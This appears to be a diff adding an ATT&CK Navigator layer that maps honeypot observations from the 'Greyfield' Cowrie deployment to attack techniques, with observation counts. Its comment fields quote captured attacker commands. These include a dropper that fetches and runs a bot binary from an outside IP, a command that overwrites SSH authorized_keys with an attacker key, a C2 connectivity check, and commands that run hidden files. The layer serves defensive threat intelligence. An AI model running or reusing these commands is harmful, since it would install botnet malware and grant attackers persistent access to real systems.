@@ -1,0 +1,87 @@
+{
+  "name": "Greyfield observed techniques",
+  "versions": {
+    "attack": "19.2",
+    "navigator": "5.1",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "ATT&CK techniques mapped conservatively from Greyfield Cowrie observations; counts represent observed evidence, not attributed incidents.",
+  "techniques": [
+    {
+      "techniqueID": "T1059.004",
+      "score": 4690,
+      "comment": "sh; system",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 3846,
+      "comment": "enable / linuxshell; enable\\x00 / linuxshell\\x00",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 1579,
+      "comment": "ls /home; /bin/busybox BOTNET; #!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null) if [ \"$result\" != \"${result%(deleted)}\" ]; then kill -9 \"$pid\" fi done",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 295,
+      "comment": ">/boot/.f && chmod 777 /boot/.f && /boot/.f && cd /boot/;; >/data/.f && chmod 777 /data/.f && /data/.f && cd /data/;",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 118,
+      "comment": "Malformed transfer reference withheld; http://169.128.70.53:8000/bot_x86_64_c",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 86,
+      "comment": "uname -m; uname -a",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 50,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~; pkill -9 -f bot_x86_64_c 2>/dev/null; rm -f /tmp/bot_x86_64_c; (curl -fsSL -o /tmp/bot_x86_64_c http://169.128.70.53:8000/bot_x86_64_c || wget -q -O /tmp/bot_x86_64_c http://169.128.70.53:8000/bot_x86_64_c || busybox wget -q -O /tmp/bot_x86_64_c http://169.128.70.53:8000/bot_x86_64_c || python3 -c \"import urllib.request;urllib.request.urlretrieve('http://169.128.70.53:8000/bot_x86_64_c','/tmp/bot_x86_64_c')\" 2>/dev/null || python -c \"import urllib;urllib.urlretrieve('http://169.128.70.53:8000/bot_x86_64_c','/tmp/bot_x86_64_c')\" 2>/dev/null); chmod 755 /tmp/bot_x86_64_c 2>/dev/null; (nohup /tmp/bot_x86_64_c >/dev/null 2>&1 &); (setsid /tmp/bot_x86_64_c >/dev/null 2>&1 &); (/tmp/bot_x86_64_c >/dev/null 2>&1 &); sleep 2; if [ -f /tmp/bot_x86_64_c ]; then SZ=$(wc -c < /tmp/bot_x86_64_c 2>/dev/null||echo 0); if [ \"$SZ\" -gt 2000 ]; then echo DROP_OK; else echo DROP_SMALL; fi; else echo DROP_NO; fi",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 9,
+      "comment": "(ss -tn 2>/dev/null||netstat -tn 2>/dev/null)|grep -q 169.128.70.53:7002 && echo C2OK || echo C2NO; /ip cloud print",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 9,
+      "comment": "top; ps -ef | grep '[Mm]iner'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "score": 7,
+      "comment": "crontab -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 7,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#17131f",
+      "#7857ff",
+      "#ff5d73"
+    ],
+    "minValue": 0,
+    "maxValue": 4690
+  }
+}
